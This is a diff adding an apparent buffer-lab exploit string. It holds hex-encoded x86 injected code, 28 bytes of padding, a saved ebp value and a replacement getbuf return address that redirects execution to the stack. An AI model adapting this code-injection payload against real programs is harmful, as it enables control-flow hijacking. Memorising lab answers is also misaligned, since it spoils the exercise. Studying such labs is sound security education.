@@ -1,0 +1,13 @@
+/* inject code
+   0:	b8 be 8d 04 08       	mov    $0x8048dbe,%eax
+   5:	50                   	push   %eax
+   6:	b8 b7 b2 05 10       	mov    $0x1005b2b7,%eax
+   b:	c3                   	ret    
+*/
+b8 be 8d 04 08 50 b8 b7 b2 05 10 c3
+/* 28 byte placeholder */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* ebp save value */
+e0 35 68 55
+/* getbuf return value */
+88 35 68 55
